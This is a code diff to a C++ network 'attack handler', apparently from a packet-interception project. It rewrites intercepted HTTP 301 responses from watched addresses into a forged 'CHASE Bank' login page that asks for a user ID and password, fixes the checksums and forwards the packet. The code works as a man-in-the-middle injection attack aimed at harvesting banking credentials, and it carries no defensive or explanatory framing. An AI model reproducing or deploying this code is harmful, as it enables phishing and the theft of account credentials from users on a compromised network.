@@ -5,6 +5,9 @@
  *      Author: philiplundrigan
  */
 
+//sudo LD_LIBRARY_PATH=/usr/local/lib bin/wifu --verbose --config conf/attack.conf --handler attack
+
+
 #include "attack_handler.h"
 
 #define DEBUG(s) if(verbose_) { cout << s << endl; }
@@ -50,48 +53,45 @@ void Attack_Handler::input(IPPacket& p) {
 	// check if it is an IP address we care about
 	// and it is a http response
 	if(on_watch_list(packet) && is_http_response(packet)){
-		packet.set_payload_length(1460);
-		packet.set_ip_datagram_length(1460);
-		DEBUG("Dropping packet");
-		TCPPacket new_packet((Packet &)packet, true);
+		char *temp3 = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
 
-		DEBUG("before set datagram size: " << new_packet.get_ip_datagram_length());
-		new_packet.set_ip_datagram_length(1460);
-		DEBUG("after setdatagram size: " << new_packet.get_ip_datagram_length());
+		if(strncmp(temp3, "HTTP/1.1 301", 12) == 0){
 
-		DEBUG("---------------OLD PAYLOAD----------------------");
-		DEBUG(packet.to_s());
-		char *temp2 = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
-		DEBUG("Payload: " << temp2);
-		DEBUG("------------------------------------------------");
-		DEBUG("after old payload datagram size: " << new_packet.get_ip_datagram_length());
-		// get the pointer to payload
-		char *payload = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
-		string new_html = "HTTP/1.1 200 OK\r\nServer: Apache\r\nDate: Sat, 01 Dec 2012 18:05:58 GMT\r\nContent-Type: text/html\r\nContent-Length:505\r\nConnection: close\r\nVary: Accept-Encoding\r\nExpires: Sat, 01 Dec 2012 18:04:07\r\nCache-Control: no-cache\r\n\r\n<!DOCTYPE html><html><head><title>CHASE Bank</title><style type=\"text/css\">.auto-style1 {font-family: \"Gill Sans\", \"Gill Sans MT\", Calibri, \"Trebuchet MS\", sans-serif;}</style></head><body><h1 class=\"auto-style1\">CHASE Bank</h1><h3>Your Security is our Top Priority</h3><p>Welcome</p><form method=\"post\">User Id <input name=\"Text1\" type=\"text\" /><br />Password <input name=\"Password1\" type=\"password\" /></form><form method=\"post\"><input name=\"Submit1\" type=\"submit\" value=\"submit\" /></form></body></html>";
+			packet.set_payload_length(1460);
+			packet.set_ip_datagram_length(1460);
+			DEBUG("Dropping packet");
 
-		//string new_html = "HTTP/1.1 301 Moved Permanently\r\nConnection: close\r\nLocation: http://www.lundrigan.org/\r\n\r\n";
+			TCPPacket new_packet((Packet &)packet, true);
 
-		DEBUG("after new_html datagram size: " << new_packet.get_ip_datagram_length());
-		// change the payload
+			DEBUG("---------------OLD PAYLOAD----------------------");
+			DEBUG(packet.to_s());
+			char *temp2 = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
+			DEBUG("Payload: " << temp2);
+			DEBUG("------------------------------------------------");
 		
-		//new_packet.set_ip_source_address(new_packet.get_ip_source_address() - 10);
-		strcpy(payload, new_html.c_str());
-		DEBUG("after strcpy datagram size: " << new_packet.get_ip_datagram_length());
-
-		new_packet.recalculate_ip_checksum();
-		new_packet.recalculate_tcp_checksum();
-
-		DEBUG("after checksumdatagram size: " << new_packet.get_ip_datagram_length());
-
-		DEBUG("---------------NEW PAYLOAD----------------------");
-		DEBUG(packet.to_s());
-		char *temp = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
-		DEBUG("Payload: " << temp);
-		DEBUG("------------------------------------------------\n\n");
+			// get the pointer to payload
+			char *payload = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
 		
-		DEBUG("after new packet datagram size: " << new_packet.get_ip_datagram_length());
-		// let the packet through
-		new_packet.accept();
+			string new_html = "HTTP/1.1 200 OK\r\nServer: Apache\r\nDate: Sat, 01 Dec 2012 18:05:58 GMT\r\nContent-Type: text/html\r\nContent-Length:505\r\nConnection: close\r\nVary: Accept-Encoding\r\nExpires: Sat, 01 Dec 2012 18:04:07\r\nCache-Control: no-cache\r\n\r\n<!DOCTYPE html><html><head><title>CHASE Bank</title><style type=\"text/css\">.auto-style1 {font-family: \"Gill Sans\", \"Gill Sans MT\", Calibri, \"Trebuchet MS\", sans-serif;}</style></head><body><h1 class=\"auto-style1\">CHASE Bank</h1><h3>Your Security is our Top Priority</h3><p>Welcome</p><form method=\"post\">User Id <input name=\"Text1\" type=\"text\" /><br />Password <input name=\"Password1\" type=\"password\" /></form><form method=\"post\"><input name=\"Submit1\" type=\"submit\" value=\"submit\" /></form></body></html>";
+		
+			// change the payload
+			strcpy(payload, new_html.c_str());
+
+			new_packet.recalculate_ip_checksum();
+			new_packet.recalculate_tcp_checksum();
+
+			DEBUG("---------------NEW PAYLOAD----------------------");
+			DEBUG(packet.to_s());
+			char *temp = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
+			DEBUG("Payload: " << temp);
+			DEBUG("------------------------------------------------\n\n");
+		
+			// let the packet through
+			new_packet.accept();
+		}
+		else{
+			p.accept();
+		}
 	}
 	else{
 		p.accept();
